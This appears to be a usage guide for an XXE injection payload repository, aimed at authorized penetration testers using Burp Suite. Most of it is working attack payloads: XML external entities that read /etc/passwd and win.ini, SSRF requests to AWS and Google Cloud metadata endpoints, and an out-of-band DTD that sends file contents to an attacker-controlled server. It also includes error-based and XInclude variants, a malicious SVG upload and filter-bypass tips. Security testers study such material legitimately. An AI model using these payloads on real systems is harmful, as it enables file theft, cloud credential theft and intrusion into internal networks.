# XXE Injection Payload Usage Guide

This guide provides detailed examples and instructions for using the XXE injection payloads in this repository for authorized security testing.

## Table of Contents

- [Prerequisites](#prerequisites)
- [Basic Usage](#basic-usage)
- [Burp Suite Intruder](#burp-suite-intruder)
- [Manual Testing](#manual-testing)
- [Payload Customization](#payload-customization)
- [Detection and Verification](#detection-and-verification)
- [Common Scenarios](#common-scenarios)

---

## Prerequisites

Before using these payloads, ensure you have:

1. **Written authorization** to test the target application
2. **Burp Suite** (Professional or Community Edition)
3. **A web proxy** configured in your browser
4. **Basic understanding** of XML and XXE vulnerabilities
5. **A test server** for out-of-band (OOB) attacks (optional but recommended)

---

## Basic Usage

### Step 1: Identify XML Input Points

Look for applications that accept XML data:
- SOAP web services
- REST APIs accepting XML
- File upload features (SVG, DOCX, XLSX, etc.)
- XML-based authentication mechanisms
- RSS/Atom feed readers
- XML-RPC endpoints

### Step 2: Test for XML Parsing

Send a simple XML payload to verify the application parses XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>test</data>
</root>
```

### Step 3: Test for XXE Vulnerability

Try a basic XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>&xxe;</data>
</root>
```

---

## Burp Suite Intruder

### Method 1: Full XML Replacement

1. **Capture the request** containing XML in Burp Proxy
2. **Send to Intruder** (Right-click → Send to Intruder or Ctrl+I)
3. **Clear all markers** (Click "Clear §" button)
4. **Select the entire XML body** and click "Add §"
5. **Configure payload settings**:
   - Payload type: Simple list
   - Click "Load" and select a payload file from `Intruder/` directory
6. **Set payload processing** (if needed):
   - Add → Encode → URL-encode all characters (if required)
7. **Start attack** and analyze responses

### Method 2: Targeted Injection

For injecting into specific XML elements:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <username>admin</username>
    <data>§PAYLOAD_HERE§</data>
</root>
```

1. Position markers around the injection point
2. Load payloads from the appropriate file
3. Monitor responses for differences

### Method 3: Using Grep Match

To detect successful XXE exploitation:

1. Go to **Options** tab in Intruder
2. Scroll to **Grep - Match** section
3. Add keywords to detect:
   - `root:x:` (Linux passwd file)
   - `[extensions]` (Windows win.ini)
   - `AWS` (Cloud metadata)
   - Error messages indicating file access

---

## Manual Testing

### Testing File Disclosure

**Linux Systems:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Windows Systems:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

**PHP Filter (Base64 Encoding):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

Then decode the Base64 response.

### Testing SSRF

**AWS Metadata:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

**Google Cloud Metadata:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
<root>&xxe;</root>
```

**Internal Port Scanning:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>
<root>&xxe;</root>
```

### Testing Blind XXE

**Setting Up:**

1. Use Burp Collaborator (Professional) or a service like:
   - `interactsh.com`
   - Your own server with HTTP/DNS logging

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/xxe.dtd">%xxe;]>
<root>test</root>
```

**External DTD (xxe.dtd on your server):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
%eval;
%exfil;
```

---

## Payload Customization

### Placeholders to Replace

| Placeholder | Replace With |
|------------|--------------|
| `ATTACKER-SERVER.com` | Your server domain/IP |
| `burpcollaborator.net` | Your Burp Collaborator domain |
| `/etc/passwd` | Target file path |
| `FILE_PATH` | Specific file you want to read |
| `PORT` | Port number for SSRF |

### Example Customization

**Before:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER-SERVER.com">]>
```

**After:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.attacker.com">]>
```

---

## Detection and Verification

### Signs of Successful Exploitation

1. **File Disclosure:**
   - Response contains file contents
   - Look for `root:x:0:0` (passwd file)
   - Windows file signatures

2. **SSRF:**
   - Different response times
   - Different response sizes
   - Error messages revealing internal services

3. **Blind XXE:**
   - DNS/HTTP callbacks to your server
   - Check server logs for incoming connections

### Response Analysis

**Using Burp Suite:**

1. **Comparer Tool:**
   - Send baseline and XXE responses to Comparer
   - Look for differences in content/length

2. **Logger:**
   - Enable logging in Burp
   - Look for callback connections

**Using Command Line:**

Monitor your server for callbacks:

```bash
# HTTP Server
python3 -m http.server 80

# DNS Monitoring
tcpdump -i any -n port 53

# Check logs
tail -f /var/log/apache2/access.log
```

---

## Common Scenarios

### Scenario 1: SOAP Web Service

**Original Request:**
```xml
POST /api/soap HTTP/1.1
Host: target.com
Content-Type: text/xml

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <UserId>123</UserId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

**XXE Injection:**
```xml
POST /api/soap HTTP/1.1
Host: target.com
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <UserId>&xxe;</UserId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### Scenario 2: SVG File Upload

**Create malicious SVG (evil.svg):**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Upload the file** and check if the content is rendered or accessible.

### Scenario 3: XInclude Attack

When you can't modify the DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Scenario 4: Error-Based Exploitation

For blind XXE with error messages:

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

The error message may leak the file contents.

---

## Testing Workflow

### Recommended Testing Order

1. **Basic In-Band XXE** → Start with simple file disclosure
2. **Error-Based XXE** → If no direct output
3. **Out-of-Band (Blind) XXE** → If completely blind
4. **SSRF via XXE** → Test internal network access
5. **XInclude** → If DOCTYPE modification blocked
6. **Special File Types** → SVG, DOCX, etc.

### Test Checklist

- [ ] Basic file reading (Linux)
- [ ] Basic file reading (Windows)
- [ ] PHP filter/wrapper
- [ ] SSRF to internal services
- [ ] Cloud metadata endpoints
- [ ] Blind XXE with OOB
- [ ] Error-based exploitation
- [ ] XInclude injection
- [ ] SVG file upload
- [ ] SOAP endpoint testing
- [ ] Parameter entity exploitation

---

## Tips and Best Practices

1. **Start Simple:** Begin with basic payloads before trying advanced techniques
2. **Document Everything:** Keep notes of what works and what doesn't
3. **Be Patient:** Some blind XXE techniques may take time to trigger
4. **Check Logs:** Always monitor your server logs for callbacks
5. **Use Encoding:** Try URL-encoding or other encodings if payloads are filtered
6. **Test Different Protocols:** Try file://, http://, ftp://, etc.
7. **Error Messages:** Pay attention to XML parser errors - they reveal information
8. **Response Time:** Timing differences can indicate successful SSRF
9. **Content-Type:** Try different Content-Type headers (application/xml, text/xml)
10. **Bypass Filters:** Use character encoding tricks (UTF-7, UTF-16, etc.)

---

## Troubleshooting

### Payload Not Working?

1. **Check XML Syntax:** Ensure the XML is well-formed
2. **Check Encoding:** Try different character encodings
3. **Try Different Wrappers:** php://, file://, http://, etc.
4. **Check File Paths:** Verify the file exists on the target system
5. **Test with Known Files:** Use common system files
6. **Review Error Messages:** Parser errors provide clues
7. **Try Blind Techniques:** Switch to out-of-band if in-band fails

### No Response?

- The parser might be secure (entities disabled)
- Try different payload types (XInclude, error-based)
- Check if the application actually processes XML
- Verify your OOB server is accessible

---

## Security Reminders

⚠️ **Always obtain proper authorization before testing!**

- Only test systems you own or have explicit permission to test
- Document your authorization
- Be careful with DoS payloads - they can crash services
- Don't exfiltrate sensitive data in production environments
- Follow responsible disclosure practices
- Comply with local laws and regulations

---

## Additional Resources

- [OWASP XXE Testing Guide](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE Lab](https://portswigger.net/web-security/xxe)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

---

**Happy (Ethical) Hunting! 🎯**